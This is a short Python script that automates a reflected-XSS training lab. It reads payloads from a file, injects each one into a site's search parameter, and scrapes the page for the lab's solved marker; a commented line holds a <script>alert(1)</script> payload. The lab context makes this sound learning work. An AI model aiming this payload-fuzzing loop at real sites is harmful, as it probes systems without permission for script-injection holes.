# Lab: Reflected XSS into HTML context with nothing encoded

import requests
import sys
from bs4 import BeautifulSoup
# For deprecating the warnings
requests.packages.urllib3.disable_warnings()

# Determine proxy details to intercept the request within the burp proxy
# requests.proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

if __name__ == "__main__":
    try:
        base_url = sys.argv[1].strip()
    except Exception:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

# read the payloads from the file
with open("payload.txt", "r") as f:
    payload_list = f.read().splitlines()
# exploit_payload = "<script>alert(1)</script>"
print(payload_list)
for exploit_payload in payload_list:
    target_url = base_url + "/?search=%s" % exploit_payload
    print(target_url)
    crafted_request = requests.get(target_url)

    response = crafted_request.text
    data = []
    soup = BeautifulSoup(response, features="lxml")
    # once problem get solved, need to check about the class: "widgetcontainer-lab-status is-solved"
    data = soup.find("div", {"class" : "widgetcontainer-lab-status is-solved"})

    if data is None:
        # print(exploit_payload)
        print("Trying out more payloads from the payload.txt file...")
        print("Not Solved! :( \n")
    else:
        print("Solved!!! :) ")
        # print("Working payload(exploit) is: ", exploit_payload)
        break
